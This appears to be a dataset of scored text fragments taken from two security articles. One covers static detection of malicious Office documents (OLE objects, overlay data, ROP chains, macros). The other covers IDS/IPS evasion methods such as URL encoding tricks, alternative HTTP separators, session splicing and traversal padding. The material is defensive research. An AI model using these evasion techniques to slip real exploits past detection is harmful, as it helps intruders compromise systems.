"Microsoft OLE links or Microsoft OLE embedded objects are represented in RTF documents as RTF objects, more precisely as a parameter to the RTF control word ‘objdata’. The data for the object is hex encoded, stored in the OLESaveToStream format, which is supplied to the respective OLE application for processing when the OLE client is loaded into the application via a specified Class ID. It is imperative that this embedded OLE object is extracted from the RTF document and scanned for possible malicious code. On several occasions, crafted RTF exploits used as lure documents to execute a targeted attack have been observed to embed shellcodes in the object data and to exploit the vulnerability in the embedded OLE controls.",0.01284956633981349
"The CVE-2015-2424 RTF exploit, as shown in Figure 6, uses a multiple COM loading technique where malicious code is planted within the Forms.Image.1 OLE object while exploiting a memory corruption vulnerability within the Control.TaskSymbol.1 OLE object.",0.013798281461799955
Figure 6: CVE-2015-2424 uses a multiple COM loading technique.,0.011336784266028133
Figure 7 shows the injected code inside the OLE object.,0.016481642271160668
Figure 7: Injected shellcode inside OLE object.,0.01602486248938595
"The Static Analysis Engine can extract all the Microsoft OLE objects embedded inside RTF documents, parsing the RTF ‘objdata’ control word, and can inspect them for possible hidden malicious code.",0.012518069205178839
Links to external resources inside embedded Microsoft OLE objects,0.008535144785724924
"As a part of static analysis, it is critical to scan embedded OLE objects for any links pointing to external resources. Apparently, by embedding specific OLE controls inside Microsoft Office documents, exploits can be crafted to invoke respective handlers to parse or handle the downloaded resources. Evidently, attackers can take advantage of this functionality to exploit either logic bugs or resource-parsing vulnerabilities, which can eventually lead to full remote code execution.",0.01149340792159903
"Figure 8 is an example of a similar infamous RTF vulnerability, CVE-2017-0199, which was found to be exploited in the wild to deliver additional malware, and which had an embedded OLE2Link object.",0.01522023905264469
Figure 8: CVE-2017-0199 had an embedded OLE2Link object.,0.013214555579323717
"The OLE2Link object enables Winword.exe to initiate the HTTP request to fetch an .hta file from the remote server. If we look at the OLE file, the OLE Stream object contained a link to the external resource, as highlighted in Figure 9, which, based on the server response, invoked the resource handler – in this case mshta.exe to execute the inserted malicious script inside the .hta file.",0.015969502203666885
Figure 9: The OLE Stream object contained a link to the external resource.,0.014436719382005525
"Several other analogous cases have also been observed in the recent past. CVE-2017-8756 exploited the Web Service Description Language (WSDL) parsing code injection vulnerability by inserting an external link into the WSDL definition, which gets downloaded and parsed by the WSDL SOAP parser exploiting validation bug, leading to remote code execution.",0.009358246130291237
Figure 10: CVE-2017-8756 inserted an external link into the WSDL definition.,0.011366687182427948
CVE-2017-11882 was yet another vulnerability exploited in the wild to infect victims. This was a stack overflow in the Equation Editor OLE object with a link to download external resources.,0.00873540955043095
Figure 11: CVE-2017-11882 was a stack overflow in the Equation Editor OLE object with a link to download external resources.,0.011262200014037216
Overlay data in RTF files,0.008059969348030882
"Overlay data is the additional data which is appended to the end of an RTF document and is predominantly used by exploit authors to embed decoy files or additional resources either in clear or encrypted form, and usually decrypted when the attacker-controlled code is executed. Overlay data having a volume beyond a certain size should be deemed suspicious and must be extracted and analysed further. However, the Microsoft Word RTF parser will ignore the overlay data while processing RTF documents. Figure 12 shows one RTF exploit, CVE-2015-1641, with 380KB of data appended at the end of the file, storing both the decoy document and multi-staged shellcodes with appropriate markers to aid decryption when the attacker-controlled code is executed.",0.014327050734525337
Figure 12: CVE-2015-1641 with decoy document and shellcode in the overlay section of the document.,0.01307504861231723
Figure 13: CVE-2017-11826 with 189KB of overlay.,0.01413047718487237
"To test the detection of overlay data inside RTF files, we ran the Static Analysis Engine over 2,483 RTF files with large-sized overlay data. The results are shown in Table 1. We found that more than 90% of the RTF documents with overlay data of more than 500 bytes had been found malicious as per VirusTotal detection.",0.015389394432528625
Size of RTF overlay data section,0.00922065132728056
"Total RTF documents having overlay tested: 2,483",0.012376901382725736
"Overlay data section > 100B found: 2,310 [ 93 %]",0.010725252987242473
Overlay > 500B,0.007797418718139104
"Total found: 2,093",0.009559895165778043
"Malicious: 1,928 [ 92.11 %]",0.008755741764132408
300B > Overlay <= 500B,0.009852056714585555
Total found: 137,0.00919634599900443
Malicious: 136 [ 99.27 %],0.009762953597423962
100B > Overlay < = 300B,0.012193693327929966
Total found: 80,0.008717847188459804
Malicious: 73 [ 91.25 %],0.009725350970783753
10B > Overlay <= 100B,0.012042993516392597
Total found: 173,0.009182326763781723
Malicious: 156 [90.17 %],0.009181357790484235
Table 1: Breakdown of results.,0.016973631524617616
Embedded files inside RTF documents,0.008637466113735393
"Besides OLE files, RTF documents can have other files embedded at multiple locations, e.g. Flash files, Office Open XML format files, image files, etc. Extracting and re-analysing the embedded files becomes extremely important as a part of the static analysis process and on several occasions can become a decisive factor in identifying zero-day exploits. Extracted files can then be forwarded to the respective analysis modules for re-analysis. For instance, RTF exploits in the recent past had been found delivering Flash zero-day exploits, subsequently infecting the target with the additional malware. To support the exploitation process, weaponized RTF documents had been observed embedding OOXML files, on most occasions to perform the heap spray. Figure 14 is a snapshot of the CVE-2017-11826 RTF exploit used in the wild embedding malicious Office Open XML files to assist the further exploitation.",0.017937805424346198
Figure 14: CVE-2017-11826 embeds malicious OOXML files.,0.013150860894052374
Static analysis of MS-OOXML (Microsoft Office Open XML) format,0.015326229154716597
"Microsoft Office version 2007 and above introduced a new way of representing the documents in the form of XML schema, which replaced the previous binary file format representation. Office Open XML file format was specifically designed to consume less storage space, to increase performance and to increase the interoperability across multiple other applications. An Office Open XML (OOXML) file is preserved on the disk in the form of a compressed archive, comprising multiple compartmentalized markup documents with described relationships among them. The security and integrity of OOXML documents was also enhanced.",0.016769839606558534
"With the new document format, attack methods in OOXML files still revolve predominantly around exploiting OLE-based vulnerabilities and embedding malicious VBA macros. A sizeable proportion of exploits used in targeted attacks have been found exploiting OLE vulnerabilities, from memory corruption or logic bugs to undermining the Windows exploit mitigations by loading vulnerable or insecure OLE objects. The Static Analysis Engine essentially emphasizes the analysis of embedded ActiveX objects for any suspicious binary streams commonly used to assist further exploitation processes. The SAE also examines the objects for other inserted file formats and extracts them in order to forward them to other independent static analysis modules.",0.010955621370380086
Suspicious loading of ActiveX objects,0.00741843915081275
"For ActiveX objects embedded inside an OOXML file, Microsoft Office creates a unique ActiveX.bin file, which is Compound Document Format, containing the CLSID corresponding to the library to be loaded in the application. Office reads the CLSID from the OLESS (OLE Structured Storage) stream and, post initialization of the OLE object, passes the storage data to the object for further processing via exposed interfaces. Attackers can abuse this OLE object-loading mechanism to load multiple OLE objects with the same but legitimate CLSID in order to perform heap spray. In some of the in‑the-wild exploits, attackers have been found using fake CLSIDs, which do not point to any of the ActiveX libraries, to optimize and accelerate the heap spray process.",0.018471080111616023
Figure 15: In some exploits attackers use fake CLSIDs which do not point to an ActiveX library.,0.015050678030953057
"It becomes important to examine if the OLE objects in the Office OOXML document are loaded suspiciously, along with performing a stream analysis of ActiveX.bin files for any malicious attributes. The same ActiveX object loading repeatedly should be deemed suspicious and corresponding .bin files should be analysed further.",0.01309624263582243
Figure 16: The same CLSID loading multiple times should be considered suspicious.,0.015462129555128268
"Another exploit, CVE-2017-11826, used in multiple targeted attacks, loaded a non-existent CLSID multiple times to be able to optimize and accelerate the heap spray process. Since there is no library associated with the class-id, heap spray time can be drastically reduced, increasing the overall performance.",0.013386512362855929
Figure 17: CVE-2017-11826 loaded a non-existent CLSID multiple times.,0.012325096270441205
Identifying ROP chains and sledges in OLE object,0.007871301529402075
"The Static Analysis Engine also analyses the embedded OLE structured storage streams for any possible sledges, which is most likely the address within the loaded module that points to the instructions, usually a junk code to increase the possibility of successful exploitation. Sledges are then usually followed by ROP gadgets, which are subsequently executed to bypass the Windows exploit mitigations. Figure 18 shows an OLE stream from one of the previous exploits used in the targeted attacks, highlighting the sledges, ROP chain and the shellcode.",0.012885537341154718
"Figure 18: OLE stream with sledges, ROP chain and shellcode highlighted.",0.014643192169349839
The SAE applies an analysis algorithm to guess the valid address sequence within the binary stream and then attempts to further establish the sequence by performing deeper checks to eliminate false positives. Figure 19 shows the result of the SAE correctly extracting the ROP chain and the sledge from the binary stream shown in Figure 18.,0.01298941839832446
Figure 19: The SAE correctly extracts the ROP chain and sledge.,0.013859912949938602
Static analysis of MS-CFB (Microsoft Compound File Binary File) format,0.015619462799917883
"Compound Binary File format is a complex and legacy file format that existed before Office 2007, after which the newer and much simpler OOXML format was introduced. A compound file format provides a user with an efficient way to store multiple different kinds of objects (images, charts, documents, etc.) within a single hierarchical file structure in the form of stream and storage objects. All these stream and storage objects are stored in a separate directory entry, collectively known as structured storage, which increases the overall performance of the file system. Compound file format is organized in the form of sectors, containing user-defined data for stream objects; directory sectors which contain several directory entries; and free space to store additional objects when required. Sectors can be of multiple types such as FAT sectors, DIFAT sectors and mini FAT sectors.",0.01940231583431762
Scanning storage and stream objects,0.008025518396682085
"While variants of FAT sectors are predominantly for the allocation of space within the compound file, there is one that is of primary interest to us: File Directory sectors, which contain information about the stream objects and storage objects. Stream sectors are typically a collection of bytes and contain the user-defined data streams. There are no restrictions on the contents of the stream. It is critical for the Static Analysis Engine to parse the directory entries and locate these stream objects to be able to scan the byte streams for malicious code. Figure 20 shows an instance of the previous exploit parsed by the available Compound Binary File format parser, showing all the directory entries and storage types.",0.014839786756322804
Figure 20: Exploit parsed by the Compound Binary File format parser.,0.012044284982925424
"Another section of the Compound Binary File which is of specific interest is the ObjectPool storage. ObjectPool storage contains storage for the embedded OLE objects and can be abused by attackers to insert malicious code into the weaponized exploits, as discussed in the earlier sections. Figure 21 shows the CVE-2018-4878 MS-CFB file-embedding Flash exploit, where the Static Analysis Engine extracts all the stream objects.",0.016778025002702535
Figure 21: The SAE extracts all the stream objects.,0.015217994342526686
"On analysis of the stream data, malicious code was identified in the ‘Contents’ stream of the ObjectPool storage.",0.010003027186688773
Figure 22: CVE-2018-4878: Compound Document format with embedded Flash exploit.,0.014955021427715653
"While ObjectPool storage is one of the critical areas in the Compound Binary File format to examine, it is also essential, as indicated before, to locate stream objects in the other directory entries and scan them as well, predominantly looking for signs of embedded malicious code. Figure 23 shows an instance of a weaponized Microsoft PowerPoint exploit, where malicious code was found hidden in the ‘PowerPoint Document’ binary stream.",0.011007905685448738
Figure 23: A weaponized PowerPoint exploit.,0.019159749782609037
Extraction and analysis of VB macro code,0.009492035475606952
"In Compound Binary files, Visual Basic macro source code is located across multiple streams under the storage object called macros at the root storage of the OLE file. The macros storage object contains a VBA structured storage object which contains the /VBA/_VBA_PROJECT, /VBA/dir/ and several other streams containing macro source code. This code is stored as a compressed stream in the binary structure using rgw RLE (Run Length Encoding) compression algorithm, hence it is necessary to parse these binary streams in order to locate the code stream accurately. In an OOXML file, macro source is stored in the OLE file ‘vbaProject.bin’ within the zip archive. As indicated, this is again the OLE file with the same structure as the CFB file storage, and the macro source code is stored in the same format.",0.017437105700466304
"Malicious VBA (Visual Basic Application) malware has been on the rise in the recent past. Multiple high-impact targeted attacks have been executed by embedding malicious VBA macros inside Office documents. Therefore, it is essential for any static analysis solution to extract and classify the severity of the macro code. Figures 24 and 25 illustrate the storage of macro code in the two file formats.",0.015036016918453576
Figure 24: Macro storage in the ‘ThisDocument’ stream of a compound binary file.,0.011070986002770788
Figure 25: Macro storage in the ‘ThisWorkBook’ stream of an OOXML file.,0.011001639908700511
"The VB macro code classification module can extract the embedded VB macro code from the MS-CFB and MS-OOXML file formats, and applies code analysis for classification of malicious macros. Table 2 shows the results of initial testing done over 10,500 malicious macro embedded documents.",0.01495924629307388
Positive,0.009267474675868637
Negative,0.008924058178859884
True,0.009298088857528697
96%,0.014359202770523938
3%,0.009865182153086294
False,0.008309189683624263
0.5%,0.008030518460057867
0.5%,0.008030518460057867
"Table 2: Results of initial testing over 10,500 malicious macro embedded documents.",0.019422886496655134
High-level implementation of the static analysis engine,0.00931142096750881
The Static Analysis Engine implements all of the previously described static analysis methods and concludes the classification of the input file based on the severity of the triggered heuristics. It includes multiple sub-analysis modules responsible for analysing various file formats depending upon the type of file passed as the input. Each sub-analysis engine has multiple heuristics implemented and respective checks are applied after the file is parsed by the integrated parser. It also implements an auxiliary generic stream analyser which is used by other analysis modules as and when required. Figure 26 is a high-level pictorial representation of the implementation. Analysis modules and their respective functionalities are indicated in the representation itself.,0.012966303036324622
Figure 26: Implementation of the static analysis engine.,0.016811623729894087
Results over in-the-wild exploits,0.009732789588451585
"The Static Analysis Engine has been tested with all the implemented detection techniques over a number of in-the-wild exploits used in targeted attacks. Since the exploits used in the targeted attacks are weaponized, the implemented heuristics can be best tested over them. The results of this preliminary testing are shown in Table 3.",0.01342752234728073
Exploit type,0.007015594862596397
Type,0.0106172675985855
Total exploits,0.008288640006484438
Detected,0.008357676643900525
Not detected,0.008273510350300883
Rate,0.009669448396959601
CVE-2012-0158,0.009363303007165702
Mixed exploits (Targeted attacks and variants),0.01763210465388143
2000,0.015952006335663182
1809,0.009040570396077974
191,0.014889588789944841
90.4%,0.008029817435404651
CVE 2013-3906,0.00878095105204646
Exploits used in targeted attacks,0.008153019622413327
32,0.009056414550480452
32,0.009056414550480452
0,0.00817816293997986
100%,0.01981342456918256
CVE 2014-1761,0.008395567766383838
Exploits used in targeted attacks,0.008153019622413327
35,0.014125820543019585
29,0.013688183284522037
6,0.011048869006257567
83%,0.013006518143012569
"CVE 2015-1641
CVE-2015-2424
CVE-2015-6172",0.009815150907153125
Exploits used in targeted attacks and variants,0.008049822162020659
150,0.01347533721001315
138,0.011860221375677882
12,0.014166908958199165
92%,0.011633180001139665
CVE 2016-4117,0.008980183017540111
Exploits used in targeted attacks,0.008153019622413327
87,0.016445280380103955
77,0.015650512797313554
10,0.012920476308127982
88.5%,0.007823017018603884
CVE-2017-11882,0.010503117797025618
Exploits used in targeted attacks,0.008153019622413327
12,0.014166908958199165
11,0.01644049437565409
1,0.011966970221767848
91.6%,0.008063231485393008
"CVE 2018-4878
CVE-2018-15982",0.0090419233394885
Exploits used in targeted attacks,0.008153019622413327
30,0.01155056622979278
27,0.015290189037560964
3,0.009865182153086294
90%,0.011984721927453146
Table 3: Results of preliminary testing.,0.01796592749826542
Mixed exploits detection results,0.008194928714388316
Table 4 shows the results when the Static Analysis Engine was tested over the exploit variants. This includes multiple variants of malicious files with the CVEs shown above.,0.012154147947647909
Exploit type,0.007015594862596397
Total exploits,0.008288640006484438
Detected,0.008357676643900525
Not detected,0.008273510350300883
Rate,0.009669448396959601
Exploit variants from 2012 to 2018,0.007836198217620605
4185,0.008193809381376926
3754,0.008348675529382565
431,0.008748233219592172
89.70%,0.00753683505367686
Table 4: Results when the Static Analysis Engine was tested over exploit variants.,0.015155864709695877
"It seems that the discussed detection mechanisms show a lot of promise in mitigating targeted attacks. Careful selection and implementation of additional heuristics will significantly improve the detection rate and, together, can certainly help to mitigate future attacks.
",0.024051564647151746
"Evasions in Intrusion Prevention/Detection Systems
2010-04-01",0.00918151717810245
"Abhishek Singh
Microsoft
,
USA",0.009528476265688646
"Scott Lambert
Microsoft
,
USA",0.008390103287770345
"Tanmay A. Ganacharya
Microsoft
,
USA",0.010387961284260894
"Jeff Williams
Microsoft
,
USA
Editor:
Helen",0.009416318497070031
"Martin
Abstract
Abhishek Singh and colleagues look at some of the more common methods of evading IDS/IPS detection and the ways in which solutions can counter these evasive techniques.
Copyright © 2010 Virus Bulletin",0.01632255646282832
"Use of an Intrusion Prevention System (IPS) and/or Intrusion Detection System (IDS) can be very effective in preventing and/or detecting the exploitation of certain classes of vulnerability over the network. This is most commonly achieved by matching patterns against the raw bytes sent over the network. This approach can be improved upon by breaking the raw bytes into constituent parts (protocol fields) before applying appropriate checks on the parsed data. The goal is to maximize both the confidence of the detection (match) and the resilience of the IDS/IPS systems to evasion.
There are many different types of protocol decoder in IDS/IPS systems. Some devices have protocol decoders which parse both the client and server messages, and have the capability of forwarding the traffic from one protocol to another. Some protocol decoders are limited to parsing the server messages, while others do not provide any forwarding of traffic to other layers. However, regardless of the type of protocol decoding used, detection can be evaded.
The structure and usage of each protocol is different. A protocol can accept an external input in various forms, and this can be a weakness. For example, in the case of HTTP, the web server www.microsoft.com can also be referred to as www.%6D%69%63%72%6F%73%6F%66%74%2E%63%6F%6D. While a strong signature can be developed to block attempts to exploit a given vulnerability, if the IPS/IDS itself does not take steps to prevent evasion, the signature will easily be bypassed.
In this article we look at some of the more common methods of evading IDS/IPS detection. Each section provides an overview of the problem, one or more concrete examples, and their respective solutions. A good IDS/IPS device should be able to address most, if not all, of the issues discussed in this article.",0.01472196932389791
"Does the IDS/IPS provide support for bidirectional protocol decoders?
There are two types of protocol decoder: single directional and bidirectional. In general, a single-directional protocol decoder denotes that a command has ended by using the delimiter of the command, whereas a bidirectional protocol decoder uses both the delimiter of the command and the response code. If both directions of a session are not parsed (the state is not kept), it is possible that the system will apply signature logic incorrectly. This introduces the possibility of false positive detections.
Let’s take the SMTP protocol as an example. SMTP stands for Simple Mail Transfer Protocol and is defined in RFC 5321 [1]. The normal flow of commands in SMTP is shown in Figure 1. The DATA is sent after the RCPT TO request.
Figure 1. Normal flow of commands in SMTP.
A single-directional protocol decoder will assume that the bytes that follow the DATA command are data and will allow them to pass through without checking for exploits. Figure 2 shows a situation in which the DATA command is issued before the RCPT TO request; the SMTP server will still be in a command state and will accept the command. The single-directional protocol decoder will be expecting the bytes that follow the DATA command to be data and will allow them to pass through. A bidirectional decoder, on the other hand, requires both the DATA command and the response code 354 to go to DATA state.
Figure 2. The DATA command is issued before RCPT TO.
To reduce the possibility of false positives, it is recommended that an IDS/IPS system implement bidirectional protocol parsers.",0.017356564576884947
"Is the IDS/IPS able to decode encrypted data?
Several protocols support the notion of using encryption to enable some form of privacy in support of security. The general problem with encryption is that it makes it difficult, if not impossible, for a man-in-the-middle (MiTM) implementation of IDS/IPS to interpret the raw bytes correctly. For example, upon starting a session, an RPC request is made for secure services whereby a secure context is established. This secure context might include a shared session key, sequence number, verification state, and so on. The secure context is used to form a secure connection between the client and the server. The client can send an encrypted RPC message to the server using the generated session key, with an optional authentication header. Upon receiving the message, the server decrypts it with the session key before processing the RPC. So exploit variants or encrypted exploits can be generated for many RPC vulnerabilities – such as MS08-067 (CVE-2008-4250), which was a propagation vector of the infamous Conficker worm. If the detection device cannot decrypt the traffic then the encrypted exploits can bypass detection.
As well as RPC, encrypted traffic can appear on port 80 for HTTPS connections, port 465 for SMTP, port 995 for POP3 [2] and port 993 for IMAP [3].
A detection device must be able to decrypt encrypted traffic and inspect it. In some IDS/IPS implementations, scanning encrypted traffic for exploits is possible by providing the IPS with decryption keys. The IPS first decrypts the traffic and then forwards the data to its signatures.",0.012930566483201456
"Does the IDS/IPS provide support for encoded data?
In many cases, protocols allow data to be encoded in various formats (encodings). These encodings are often published standards which can be used to transmit data. An IDS/IPS system acting as a MiTM should provide support for these various formats. If the IDS/IPS cannot return the encoded data to some ‘common/normal’ form, both the number and effectiveness of signatures will be impacted. Let’s consider a few encodings in HTTP, MIME and RPC.",0.016855876891960442
"Encodings in HTTP
The HTTP protocol is defined in RFC 2616 [4]. The URL field in HTTP can be used to exploit various vulnerabilities, hence many signatures are written to check the value of these fields. Signatures generally monitor the URL field in HTTP traffic.
The URL field can be encoded in many ways. The following are some of the encodings which are supported by various application web servers and can also be used by an attacker for encoding exploits:
Hex encoding: this is an RFC-compliant encoding in which an ASCII value is replaced by its hexadecimal value. For example, ‘A’ is represented as ‘%41’.
Double percentage encoding: this is based on normal hex encoding, the only difference being that the ‘%’ value is replaced by its hex value, i.e. ‘%25’. In this type of encoding, ‘A’ is represented as ‘%2541’.
Double nibble hex encoding: this is based on the standard hex encoding method, in which each nibble is hex encoded. For example, ‘A’ can be encoded as ‘%%34%31’. ‘%34’ resolves to 4 and ‘%31’ resolves to 1; thus, the encoding resolves to ‘A’.
Second nibble encoding: this differs from the first nibble encoding in that the second nibble value is encoded with a normal encoding. For example, ‘A’ is encoded as ‘%4%31’. ‘%31’ resolves to 1 and ‘%41’ resolves to ‘A’.
Microsoft %U encoding: the format for this encoding is ‘%UXXXX’, as shown in Figure 3. In this type of encoding, ‘%U’ is followed by four hexadecimal digits. For example, ‘a’ can be represented as ‘%U0041’.
Figure 3. %U encoding in the GET request of HTTP.
Mismatch encoding: here, various types of encoding like hex, double nibble, second nibble and Microsoft %U encoding are combined to encode a single character. For example, in hex ‘U’ is encoded as ‘%55’. So, using mismatch encoding, ‘%U0041’ will be encoded as ‘%%550041’.
UTF-8 bare byte encoding: this is similar to UTF-8 encoding, the only difference being that UTF-8 byte sequences are not escaped with a percentage. Byte sequences are sent with the actual bytes.
Parameter evasion using POST and content encoding: if base64 is specified in the content encoding, parameter fields in the post request will be base64-encoded. Hence, the detection device will first have to decode the base64 and then check the stream for malicious content. Decoding of base64 can add extra overhead to the detection system.",0.02394514418862337
"Encodings in MIME
As per RFC 2047 [5], there can be two types of MIME encoding: ‘B’ encoding, which is similar to base64 encoding, and ‘Q’ encoding, which is similar to quoted-printable content-transfer encoding. When a MIME message contains unknown RFC 2047 encoding, the detection device can either block the connection, assuming the encoding to be malformed, or it will decode the messages. RFC 2047 encodings provide a vector for evasion in the sense that the client can successfully decode messages in cases where the intrusion detection system is not able to decode them.
RFC 2045 [6] provides the content-transfer-encoding field, which allows the specification of an encoding type to enable eight-bit data to travel successfully through seven-bit transport mechanisms. Content-transfer encoding supports seven-bit, eight-bit, binary, quoted-printable and base64 encodings. The content-transfer-encoding field can be used to support other encodings as well, such as uuencode, mac-binhex40 and yenc. By encoding an exploit using an encoder that is supported by the email clients but not by the IPS, detection can be bypassed.",0.018584056430373197
"Encodings in RPC
The RPC protocol [7] is used to perform client-server communication. The protocol makes use of the external data representation protocol which standardizes the representation of external data in remote communications. In RPC protocol, the client tries to access a remote computer, and the server is a machine that implements network remote procedures. The client makes a remote procedure call to the server and receives a reply which contains the result of the call. RPC supports various transports: TCP, HTTP, UDP and SMB. The RPC messages require unique specification of a procedure to call, matching of response messages to request messages, and authentication of caller to service and service to caller. The data in RPC protocol can be represented in big-endian, little-endian, Unicode, EBCDIC or ASCII strings. The exploit-specific signatures in RPC are prone to evasion.
Some of the evasions that are a result of various encodings are discussed in the following sections.
Endianness selection: in the header of every DCE RPC request there exists a data representation field in which the byte ordering, character set and floating-point representation are specified. Little-endian is used as default. However, even if the flag is changed to big-endian, the RPC request can be treated as a valid request. Based upon the value of the flag, an intrusion prevention system should be able to parse the packet. The detection device can be bypassed if it is not able to differentiate between the big-endian and little-endian packets.
Figure 4. Endianness in the DCE header.
Unicode and non-Unicode evasion: the SMB header provides a two-byte Flag2 field which is used to determine whether the strings will be in Unicode or non-Unicode characters in the SMB header. Non-Unicode characters are used when the value of Flag2 is not set. Hence, all SMB commands, RPC functions and data will be in non-Unicode format. Based upon the Unicode or non-Unicode characters in the header, signatures should be able to check the incoming stream for exploits.
Figure 5. Flag2 with Unicode strings.
Where encoded data is concerned, the challenge is in making sure that the IDS/IPS system is capable of returning the encoded data to some normal form before signatures are applied. This allows the number of signatures required to address a given vulnerability to be kept to a minimum – for example, in the case of HTTP there will be at least eight signatures if the IPS does not provide support to decode data.",0.016234114193126592
"Does the IDS/IPS support forwarding of data from one protocol decoder to another?
Several application-level protocols leverage the TCP/IP stack to ride on top of one another; failure of the IDS/IPS system to decompose raw bytes that use one or more protocols during an exchange generally results in missing attack vectors and, in the worst case, false negatives.
For example, the MS-RPCH (Remote Procedure Call over HTTP [8]) protocol tunnels RPC network traffic from an RPC client to an RPC server through a network agent referred to as an RPC over HTTP proxy. The protocol is applicable to network topologies where the use of HTTP- or HTTPS-based transport is necessary – for example, to traverse an application firewall where the application or computer systems communicating over the topology requires the use of the RPC protocol. This is used as an attack vector/evasive measure for DCOM [9] exploits such as MS03-026 and MS03-039 which arrive on ports 135, 139 and 445.
The protocol decoder should be able to forward the MS-RPCH traffic data from HTTP to the DCOM protocol decoder. Similarly, the SMTP headers and the HTTP traffic should be forwarded to the MIME protocol decoder.",0.01084151367314512
"Does the IDS/IPS provide anti-evasion measures for application-specific evasions?
In different applications a given protocol may be implemented in slightly different ways. As a result, protocol decoders for an IDS/IPS system need to relax the RFC compliance enforcement (i.e. implement it loosely) to account for the different implementations. Evasive methods appearing in protocols might not appear in all applications. The detection device should have application-specific anti-evasion measures.",0.019933575747093202
Application-specific evasions in HTTP,0.010567998084347274
"HTTP formatting
The syntax for an HTTP request is as follows:
Method <space> URI <space> HTTP/Version <CRLF>
Some web servers accept a tab between the method and the URI, making requests such as those shown in Figure 6 valid.
Figure 6. A tab is accepted as a separator between the method and URI.
If the protocol decoders of an intrusion prevention system only check for a space between the method and URI, detection can be evaded simply by sending a tab between the method and URI. Besides space and tab, some web servers also accept 0x09, 0x0b, 0x0c and 0x0d as valid separators between the method and URI.
Some web servers also accept %00 as a valid separator between the method and URI. It should be noted that NULL characters are used to denote the end of the string: the intrusion detection and prevention system stops once %00 is reached and allows the URI to pass through. Hence protocol decoders which parse the method and URI should accept %00 as a separator between the method and URI.
The syntax of HTTP v0.9 as per RFC 1945 [10] is:
GET <space> URI <CRLF.>
Only three parameters are sent in HTTP v0.9, and no headers are returned. If the HTTP v0.9 requests are not parsed correctly, then the HTTP signatures can be evaded simply by sending an exploit using HTTP v0.9 syntax.",0.018068789534901986
"Forward slash/backward slash
Many web servers are flexible in accepting requests. For example, the request http://www.domain.com/index.html is similar to the request http://www.domain.com\index.html. So if the detection device only checks for forward slash patterns it can be evaded by sending a backward slash pattern.",0.013197497766941457
"Method matching
Based on the implementation of CGI, it is often possible to use HEAD in place of POST. In some implementations, the method is ignored. Hence in many systems, an attacker can use the GET or the POST methods interchangeably in an exploit. If the detection device checks for a GET request followed by checking the URI for exploits, it can be evaded by using POST and the exploit URI pattern.",0.012389927185877836
"Case sensitivity
In many implementations of web servers, GET /exploit HTTP/1.0 is similar to GET /EXPLOIT HTTP/1.0. The signatures checking the URI for exploits must be case-insensitive.",0.012187172565671367
"Application-specific evasions in MIME
RFC 822, section 3.1.2, specifies that header fields are lines which are composed of a field name, followed by (‘:’), followed by a field body, and are terminated by CRLF. A separator is used to differentiate between the field names and the field body. Non-standard separators that are accepted by applications include a double colon, or the colon may be omitted altogether. If the MIME protocol decoders are not able to accept non-standard separators, they will not be able to separate the field name from the field body; signatures in turn will not be able to sanitize these fields and detection can be evaded.
RFC 2822 [11] states: ‘Strings of characters that include characters other than those allowed in atoms may be represented in a quoted string format, where the characters are surrounded by quote (DQUOTE, ASCII value 34) characters.’ Non-standard quoting includes quoting fields that should not be quoted, duplicating quotes, and the omission of leading or trailing quote characters from a string. Often, these non-standard quotings are accepted by applications but are not accepted by detection devices. Hence, if an exploit uses non-standard quotings, these may be accepted by the application, and the detection device will fail to properly parse and sanitize the traffic, allowing the exploit to go undetected.
Quoting RFC 822 [12], ‘A comment is a set of ASCII characters which is enclosed in matching parentheses and which is not within a quoted string. The comment construct permits message originators to add text which will be useful for human readers, but which will be ignored by the formal semantics. Comments should be retained while the message is subject to interpretation according to this standard. However, comments must NOT be included in other cases, such as during protocol exchanges with email servers.’ When an unexpected RFC 822 comment is present, the MIME message is either regarded as malformed and blocked, or the protocol decoder fails to interpret it correctly, which can lead to failure to detect an exploit.",0.02329383469761781
"Does the IDS/IPS provide support for the reassembly of segmented and fragmented data?
It is possible for an attack to be spread over multiple packets. Protocols like MSTDS [13], Sun RPC, RPC and HTTP support fragmentation of packets while streaming. Since a server provides the capability of reassembling the disassembled packets, exploits can take advantage of this and spread across packets.
Taking the case of MSTDS, the protocol has the following structure:
Offset Size   Description
-----------   -------------",0.0173886354544589
"0x0000 1      Type (0x01 for query)
0x0001 1      Status
0x0002 2      Length = X (big-endian)
0x0004 2      SPID (big-endian)
0x0006 1      Packet ID (big-endian)
0x0007 1      Window (unused, must be 0)
0x0008 X-8    Packet Data (Unicode)",0.0180097592492815
"To monitor for vulnerabilities, generally the Data field containing the name of stored procedures must be inspected. The Length field is a two-byte (16 bits) field in the header. If the TDS packet to be transmitted over the network is longer than the maximum 16-bit integer, then it must be split into smaller packet fragments. Each packet fragment, with the exception of the last, will contain the value 0x00 in the last packet indicator field to indicate that there are additional packet fragments to follow. On the receiving side, the full TDS packet payload is reassembled from these fragments.
In the case of HTTP, session splicing can be used to send an exploit across the packets. For example, one packet will contain ‘GET’, another will contain ‘/cgi’, another will contain ‘-bin’, and the last one will contain ‘HTTP/1.0’.
Similarly, fragmentation of RPC requests can occur. A normal piece of RPC data will contain a header and data, however, the entire RPC request can be split into multiple RPC requests. Since this is an application-level fragmentation, the IPS will have to reassemble the fragments of the packets. The IPS should have the capability of skipping the header of fragmented RPC packets and reassembling the RPC header and data. It should also check for malicious content in the packet.
In order for a detection device to prevent the spreading of an exploit across multiple packets, it is essential for it to assemble the packets in a session and then inspect them for exploits.",0.014745880497411767
"Does the IDS/IPS protect against RFC compliance evasion?
RFC provides specifications for a protocol. Evasion often occurs when an IDS/IPS fails to correctly decode a protocol into its constituent fields. As a result, it is possible that one of two outcomes occurs: a false positive and/or a false negative, depending on the nature of the decoding and signature logic. RFC-specific evasions fall under this category.",0.017134359968822843
"RFC compliance evasions in HTTP
The URI http://www.microsoft.com/en/aaaaaaaaaaaaaaaaaaaaaa/../us/default.aspx descends into /en, then further descends into the aaaaaaaaaaaaaaaaaaaaaa directory, which may or may not exist. Following the next slash is a directory traversal, /.., which basically backs into /en/us. Hence the URL is similar to http://www.microsoft.com/en/us/ default.aspx and is accepted by the web server as a valid request, pointing to the same web page.
Sometimes IDS/IPS devices only check for the first xx bytes of a request. Thus, by sending a large enough number of ‘a’ characters, the rest of the submitted request will be moved outside of the IDS system scan. So if the malicious pattern is ‘/en/us’ and the IDS/IPS only checks for the first 1k bytes, ‘/en/’ followed by 2k of ‘aaa’, followed by ‘/../us’ will successfully avoid detection by the IDS/IPS.",0.011717373817787369
RFC compliance evasions in Remote Procedure Calls,0.00933834469210404
"Multiple binding UUID
